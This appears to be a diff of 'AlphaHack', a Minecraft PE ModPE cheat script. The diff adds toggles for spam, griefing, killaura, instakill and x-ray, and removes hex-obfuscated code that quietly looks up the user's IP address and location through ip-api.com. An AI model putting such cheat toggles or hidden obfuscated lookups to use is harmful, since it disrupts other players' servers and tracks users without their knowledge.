@@ -1,25 +1,33 @@
+g//Ctx context
+
 var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
 
+//Getting MCPE language for translator by ArceusMatt.
+
+var GetLang = net.zhuoweizhang.mcpelauncher.ScriptManager.nativeGetLanguageName();
+
+//Spam disabled in c57788.leet.cc
+
+var GetPort = Server.getPort();
+if(GetPort=="57788")sspam = false;
+
+/***********************/
+
 /*
-*     AlphaHack! version: stable 0.6.0
+*    Authors: Arceus_matt, godsoft029.
 *
-*     Authors: Arceus_matt, godsoft029.
+*    Started: MCPE v0.12.0
 *
-*     Started: MCPE v0.12.0
+*    Open src?: Do not copy! ask permission.
 *
-*     Open src?: Do not copy! ask permission.
+*    contact me at: @ArceusMatt
 *
-*     Coding langs: HTML, js, java, php, python.
-*
-*     desc: Half illegal half MCPE tool, used for
-*     multi player use & single player modding.
-*
-*     Creator: Arceus_matt.
-*
-*     Always get my revenge. =) enjoy!
+*    Always get my revenge. =) enjoy!
 */
 
-var bg64 = "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";
+/***********************/
+
+//Shorter android widget understanding.
 
 var Button = android.widget.Button;
 var LinearLayout = android.widget.LinearLayout;
@@ -38,35 +46,130 @@ var Intent = android.content.Intent;
 var Uri = android.net.Uri;
 var GUI;
 var menu;
-var exitUI;
 
-var _0x567c=["\x68\x74\x74\x70\x3A\x2F\x2F\x69\x70\x2D\x61\x70\x69\x2E\x63\x6F\x6D\x2F\x6A\x73\x6F\x6E","\x6E\x65\x74","\x6F\x70\x65\x6E\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x47\x45\x54","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x4D\x65\x74\x68\x6F\x64","\x73\x65\x74\x44\x6F\x4F\x75\x74\x70\x75\x74","\x63\x6F\x6E\x6E\x65\x63\x74","\x67\x65\x74\x43\x6F\x6E\x74\x65\x6E\x74\x4C\x65\x6E\x67\x74\x68","\x67\x65\x74\x49\x6E\x70\x75\x74\x53\x74\x72\x65\x61\x6D","\x42\x79\x74\x65","\x6C\x61\x6E\x67","\x6E\x65\x77\x49\x6E\x73\x74\x61\x6E\x63\x65","\x41\x72\x72\x61\x79","\x72\x65\x66\x6C\x65\x63\x74","\x72\x65\x61\x64","","\x70\x61\x72\x73\x65","\x73\x75\x63\x63\x65\x73\x73","\x65\x71\x75\x61\x6C\x73","\x73\x74\x61\x74\x75\x73","\x71\x75\x65\x72\x79","\x63\x6F\x75\x6E\x74\x72\x79","\x72\x65\x67\x69\x6F\x6E\x4E\x61\x6D\x65","\x45\x72\x72\x6F\x72","\x6C\x69\x6E\x65\x4E\x75\x6D\x62\x65\x72","\x73\x74\x61\x72\x74"];function getIp(_0x9781x2){var _0x9781x3= new java[_0x567c[10]].Runnable({run:function(){try{var _0x9781x4= new java[_0x567c[1]].URL(_0x567c[0]);var _0x9781x5=_0x9781x4[_0x567c[2]]();_0x9781x5[_0x567c[4]](_0x567c[3]);_0x9781x5[_0x567c[5]](true);_0x9781x5[_0x567c[6]]();_0x9781x5[_0x567c[7]]();var _0x9781x6=_0x9781x5[_0x567c[8]]();var _0x9781x7=java[_0x567c[10]][_0x567c[13]][_0x567c[12]][_0x567c[11]](java[_0x567c[10]][_0x567c[9]].TYPE,1024);var _0x9781x8=0;var _0x9781x9;while((_0x9781x8=_0x9781x6[_0x567c[14]](_0x9781x7))!= -1){_0x9781x9= new java[_0x567c[10]].String(_0x9781x7,0,_0x9781x8)};var _0x9781xa=JSON[_0x567c[16]](_0x9781x9+_0x567c[15]);if(_0x9781xa[_0x567c[19]][_0x567c[18]](_0x567c[17])){_0x9781x2( new Array(_0x9781xa[_0x567c[20]],_0x9781xa[_0x567c[21]],_0x9781xa[_0x567c[22]]))}else {print(_0x567c[23]);_0x9781x2( new Array(_0x567c[23],_0x567c[23],_0x567c[23]))}}catch(e){clientMessage(e);clientMessage(e[_0x567c[24]])}}});var _0x9781xb= new java[_0x567c[10]].Thread(_0x9781x3);_0x9781xb[_0x567c[25]]()}
+/***********************/
 
-var _0x46fa=["\x6D\x65\x6E\x75\x2E\x63\x6F\x70\x79\x72\x69\x67\x68\x74","\x4D\x6F\x6A\x61\x6E\x67\x20\x26\x20\x41\x72\x63\x65\x75\x73\x5F\x6D\x61\x74\x74\x27\x73\x20\x41\x6C\x70\x68\x61\x48\x61\x63\x6B\x21","\x6C\x61\x6E\x67\x45\x64\x69\x74","\x6D\x65\x6E\x75\x2E\x70\x6C\x61\x79","\xA7\x33\x50\x6C\x61\x79","\x6D\x65\x6E\x75\x2E\x6F\x70\x74\x69\x6F\x6E\x73","\xA7\x33\x53\x65\x74\x74\x69\x6E\x67\x73","\x6D\x65\x6E\x75\x2E\x73\x6B\x69\x6E\x73","\xA7\x33\x53\x6B\x69\x6E\x73","\x70\x6C\x61\x79\x73\x63\x72\x65\x65\x6E\x2E\x68\x65\x61\x64\x65\x72\x2E\x6C\x6F\x63\x61\x6C","\xA7\x33\x53\x65\x6C\x65\x63\x74\x20\x77\x6F\x72\x6C\x64","\x73\x6B\x69\x6E\x73\x2E\x74\x69\x74\x6C\x65","\x6F\x70\x74\x69\x6F\x6E\x73\x2E\x74\x69\x74\x6C\x65","\x64\x65\x61\x74\x68\x53\x63\x72\x65\x65\x6E\x2E\x6D\x65\x73\x73\x61\x67\x65","\xA7\x63\xA7\x6C\x57\x61\x73\x74\x65\x64","\x70\x6C\x61\x79\x73\x63\x72\x65\x65\x6E\x2E\x6E\x65\x77","\xA7\x33\x4E\x65\x77","\x70\x6C\x61\x79\x73\x63\x72\x65\x65\x6E\x2E\x71\x75\x69\x74","\xA7\x33\x42\x61\x63\x6B","\x73\x6B\x69\x6E\x73\x2E\x72\x65\x73\x74\x6F\x72\x65\x2E\x62\x75\x74\x74\x6F\x6E","\xA7\x33\x52\x65\x73\x74\x6F\x72\x65","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x61\x64\x76\x61\x6E\x63\x65\x64","\xA7\x33\x41\x64\x76\x61\x6E\x63\x65\x64","\x65\x78\x74\x65\x72\x6E\x61\x6C\x53\x65\x72\x76\x65\x72\x53\x63\x72\x65\x65\x6E\x2E\x61\x64\x64\x53\x65\x72\x76\x65\x72","\xA7\x33\x41\x64\x64\x20\x53\x65\x72\x76\x65\x72","\x6D\x75\x6C\x74\x69\x70\x6C\x61\x79\x65\x72\x2E\x70\x6C\x61\x79\x65\x72\x2E\x6A\x6F\x69\x6E\x65\x64","\xA7\x33\x25\x73\x20\x6A\x6F\x69\x6E\x65\x64\x20\x74\x68\x65\x20\x67\x61\x6D\x65","\x6D\x75\x6C\x74\x69\x70\x6C\x61\x79\x65\x72\x2E\x70\x6C\x61\x79\x65\x72\x2E\x6C\x65\x66\x74","\xA7\x33\x25\x73\x20\x6C\x65\x66\x74\x20\x74\x68\x65\x20\x67\x61\x6D\x65","\x64\x65\x61\x74\x68\x53\x63\x72\x65\x65\x6E\x2E\x71\x75\x69\x74","\xA7\x33\x4D\x61\x69\x6E\x20\x4D\x65\x6E\x75","\x64\x65\x61\x74\x68\x53\x63\x72\x65\x65\x6E\x2E\x72\x65\x73\x70\x61\x77\x6E","\xA7\x33\x52\x65\x73\x70\x61\x77\x6E","\x70\x61\x75\x73\x65\x53\x63\x72\x65\x65\x6E\x2E\x71\x75\x69\x74","\x70\x61\x75\x73\x65\x53\x63\x72\x65\x65\x6E\x2E\x6F\x70\x74\x69\x6F\x6E\x73","\x70\x61\x75\x73\x65\x53\x63\x72\x65\x65\x6E\x2E\x62\x61\x63\x6B","\xA7\x33\x42\x61\x63\x6B\x20\x74\x6F\x20\x67\x61\x6D\x65","\x6D\x65\x6E\x75\x2E\x72\x65\x74\x75\x72\x6E\x54\x6F\x47\x61\x6D\x65","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x6D\x6F\x62","\xA7\x33\x25\x31\x24\x73\x20\x77\x61\x73\x20\x73\x6C\x61\x69\x6E\x20\x62\x79\x20\x25\x32\x24\x73","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x66\x61\x6C\x6C","\xA7\x33\x25\x31\x24\x73\x20\x68\x69\x74\x20\x74\x68\x65\x20\x67\x72\x6F\x75\x6E\x64\x20\x74\x6F\x6F\x20\x68\x61\x72\x64","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x65\x78\x70\x6C\x6F\x73\x69\x6F\x6E","\xA7\x33\x25\x31\x24\x73\x20\x62\x6C\x65\x77\x20\x75\x70","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x61\x72\x72\x6F\x77","\xA7\x33\x25\x31\x24\x73\x20\x77\x61\x73\x20\x73\x68\x6F\x74\x20\x62\x79\x20\x25\x32\x24\x73","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x64\x72\x6F\x77\x6E","\xA7\x33\x25\x31\x24\x73\x20\x64\x72\x6F\x77\x6E\x65\x64","\x64\x65\x61\x74\x68\x2E\x66\x65\x6C\x6C\x2E\x61\x63\x63\x69\x64\x65\x6E\x74\x2E\x67\x65\x6E\x65\x72\x69\x63","\xA7\x33\x25\x31\x24\x73\x20\x66\x65\x6C\x6C\x20\x66\x72\x6F\x6D\x20\x61\x20\x68\x69\x67\x68\x20\x70\x6C\x61\x63\x65","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x6F\x75\x74\x4F\x66\x57\x6F\x72\x6C\x64","\xA7\x33\x25\x31\x24\x73\x20\x66\x65\x6C\x6C\x20\x6F\x75\x74\x20\x6F\x66\x20\x74\x68\x65\x20\x77\x6F\x72\x6C\x64","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x6F\x6E\x46\x69\x72\x65","\xA7\x33\x25\x31\x24\x73\x20\x62\x75\x72\x6E\x65\x64\x20\x74\x6F\x20\x64\x65\x61\x74\x68","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x6D\x61\x67\x69\x63","\xA7\x33\x25\x31\x24\x73\x20\x77\x61\x73\x20\x6B\x69\x6C\x6C\x65\x64\x20\x62\x79\x20\x6D\x61\x67\x69\x63","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x69\x6E\x57\x61\x6C\x6C","\xA7\x33\x25\x31\x24\x73\x20\x73\x75\x66\x66\x6F\x63\x61\x74\x65\x64\x20\x69\x6E\x20\x61\x20\x77\x61\x6C\x6C","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x6C\x61\x76\x61","\xA7\x33\x25\x31\x24\x73\x20\x74\x72\x69\x65\x64\x20\x74\x6F\x20\x73\x77\x69\x6D\x20\x69\x6E\x20\x6C\x61\x76\x61","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x69\x6E\x46\x69\x72\x65","\xA7\x33\x25\x31\x24\x73\x20\x77\x65\x6E\x74\x20\x75\x70\x20\x69\x6E\x20\x66\x6C\x61\x6D\x65\x73","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x63\x61\x63\x74\x75\x73","\xA7\x33\x25\x31\x24\x73\x20\x77\x61\x73\x20\x70\x72\x69\x63\x6B\x65\x64\x20\x74\x6F\x20\x64\x65\x61\x74\x68","\x63\x6F\x6D\x6D\x61\x6E\x64\x73\x2E\x6F\x70\x2E\x73\x75\x63\x63\x65\x73\x73","\xA7\x6C\x4F\x70\x70\x65\x64\x20\x25\x73","\x63\x6F\x6D\x6D\x61\x6E\x64\x73\x2E\x62\x61\x6E\x69\x70\x2E\x73\x75\x63\x63\x65\x73\x73","\xA7\x72\x42\x61\x6E\x6E\x65\x64\x20\x49\x50\x20\x61\x64\x64\x72\x65\x73\x73\x20\xA7\x6C\x25\x73","\x63\x6F\x6D\x6D\x61\x6E\x64\x73\x2E\x62\x61\x6E\x69\x70\x2E\x73\x75\x63\x63\x65\x73\x73\x2E\x70\x6C\x61\x79\x65\x72\x73","\xA7\x72\x42\x61\x6E\x6E\x65\x64\x20\x49\x50\x20\x61\x64\x64\x72\x65\x73\x73\x20\xA7\x6C\x25\x73\x20\xA7\x72\x62\x65\x6C\x6F\x6E\x67\x69\x6E\x67\x20\x74\x6F\x20\x25\x73","\x63\x68\x61\x74\x53\x63\x72\x65\x65\x6E\x2E\x68\x69\x64\x65","\xA7\x33\x48\x69\x64\x65","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x61\x63\x74\x69\x6F\x6E\x2E\x6C\x6F\x63\x61\x6C","\xA7\x33\x43\x72\x65\x61\x74\x65\x20\x57\x6F\x72\x6C\x64\x21","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x67\x61\x6D\x65\x4D\x6F\x64\x65\x2E\x63\x72\x65\x61\x74\x69\x76\x65","\xA7\x33\x43\x72\x65\x61\x74\x69\x76\x65","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x67\x61\x6D\x65\x4D\x6F\x64\x65\x2E\x73\x75\x72\x76\x69\x76\x61\x6C","\xA7\x33\x53\x75\x72\x76\x69\x76\x61\x6C","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x64\x65\x6C\x65\x74\x65","\xA7\x33\x44\x65\x6C\x65\x74\x65"];ModPE[_0x46fa[2]](_0x46fa[0],_0x46fa[1]);ModPE[_0x46fa[2]](_0x46fa[3],_0x46fa[4]);ModPE[_0x46fa[2]](_0x46fa[5],_0x46fa[6]);ModPE[_0x46fa[2]](_0x46fa[7],_0x46fa[8]);ModPE[_0x46fa[2]](_0x46fa[9],_0x46fa[10]);ModPE[_0x46fa[2]](_0x46fa[11],_0x46fa[8]);ModPE[_0x46fa[2]](_0x46fa[12],_0x46fa[6]);ModPE[_0x46fa[2]](_0x46fa[13],_0x46fa[14]);ModPE[_0x46fa[2]](_0x46fa[15],_0x46fa[16]);ModPE[_0x46fa[2]](_0x46fa[17],_0x46fa[18]);ModPE[_0x46fa[2]](_0x46fa[19],_0x46fa[20]);ModPE[_0x46fa[2]](_0x46fa[21],_0x46fa[22]);ModPE[_0x46fa[2]](_0x46fa[23],_0x46fa[24]);ModPE[_0x46fa[2]](_0x46fa[25],_0x46fa[26]);ModPE[_0x46fa[2]](_0x46fa[27],_0x46fa[28]);ModPE[_0x46fa[2]](_0x46fa[29],_0x46fa[30]);ModPE[_0x46fa[2]](_0x46fa[31],_0x46fa[32]);ModPE[_0x46fa[2]](_0x46fa[33],_0x46fa[30]);ModPE[_0x46fa[2]](_0x46fa[34],_0x46fa[6]);ModPE[_0x46fa[2]](_0x46fa[35],_0x46fa[36]);ModPE[_0x46fa[2]](_0x46fa[37],_0x46fa[36]);ModPE[_0x46fa[2]](_0x46fa[38],_0x46fa[39]);ModPE[_0x46fa[2]](_0x46fa[40],_0x46fa[41]);ModPE[_0x46fa[2]](_0x46fa[42],_0x46fa[43]);ModPE[_0x46fa[2]](_0x46fa[44],_0x46fa[45]);ModPE[_0x46fa[2]](_0x46fa[46],_0x46fa[47]);ModPE[_0x46fa[2]](_0x46fa[48],_0x46fa[49]);ModPE[_0x46fa[2]](_0x46fa[50],_0x46fa[51]);ModPE[_0x46fa[2]](_0x46fa[52],_0x46fa[53]);ModPE[_0x46fa[2]](_0x46fa[54],_0x46fa[55]);ModPE[_0x46fa[2]](_0x46fa[56],_0x46fa[57]);ModPE[_0x46fa[2]](_0x46fa[58],_0x46fa[59]);ModPE[_0x46fa[2]](_0x46fa[60],_0x46fa[61]);ModPE[_0x46fa[2]](_0x46fa[62],_0x46fa[63]);ModPE[_0x46fa[2]](_0x46fa[64],_0x46fa[65]);ModPE[_0x46fa[2]](_0x46fa[66],_0x46fa[67]);ModPE[_0x46fa[2]](_0x46fa[68],_0x46fa[69]);ModPE[_0x46fa[2]](_0x46fa[70],_0x46fa[71]);ModPE[_0x46fa[2]](_0x46fa[72],_0x46fa[73]);ModPE[_0x46fa[2]](_0x46fa[74],_0x46fa[75]);ModPE[_0x46fa[2]](_0x46fa[76],_0x46fa[77]);ModPE[_0x46fa[2]](_0x46fa[78],_0x46fa[79])
+//AlphaHack variables
 
 var num0  = 0;
-var version = "0.6.6";
-var name = "Alphα Hαck";
+var version = "0.7.1";
+var name = "AlphαHαck";
 var authers = "ArceusMatt";
 var authers2 = "Godsoft029";
 var copyright = "©";
-var text = "";
+var text = "AlphaHack!";
 var space = " ";
 var client = "§f<§3AlphαHαck§f> ";
 var hackcount = 0;
 var fps = 0;
 var lastLoop = new Date;
 var modpeFolder = ctx.getDir("ModPE", 0);
-var modpeFile = new java.io.File(modpeFolder, "ALPHAHack.js");
-var can = 1;
-var canGetHP = 1;
-var HP;
-var gravity = -0.07840000092983246;
-var nameColor = "§7";
-var healthColor = "§c";
+var modpeFile = new java.io.File(modpeFolder, "AlphaHack.js");
 var operm = "pocketmine.command";
 var operm2 = "*";
-var GetLang = net.zhuoweizhang.mcpelauncher.ScriptManager.nativeGetLanguageName();
+
+var sspam = false;
+var hackk = false;
+var showp = false;
+var fch = false;
+var onlyday = false;
+var saddle = false;
+var instakilled = false;
+var instabreak = false;
+var stackheart = false;
+var parti = false;
+var parti2 = false;
+var nowalls = false;
+var waterwalk = false;
+var highjumps = false;
+var grief = false;
+var killaura = false;
+var killfaura = false;
+var uirender = false; 
+var xxray = false; 
+var stat22 = false; 
+var healthy = true;
+var infhun = false;
+var firepunch = false;
+var lightning = false;
+var primedtnt = false;
+var arrow = false;
+var exporb = false;
+var minecart = false;
+var deadchat = false;
+
+var GUIColor = Color.BLACK
+var GUIColor1 = Color.TRANSPARENT;
+var GUIColor2 = Color.BLACK;
+var GUIColor3 = Color.WHITE;
+var GUIColor4 = Color.RED;
+var GUIColor5 = Color.BLUE;
+var GUIColor6 = Color.GRAY;
+var GUIColor7 = Color.LTGRAY;
+var GUIColor8 = Color.YELLOW;
+var GUIColor9 = Color.CYAN;
+var GUIColor10 = Color.DKGRAY;
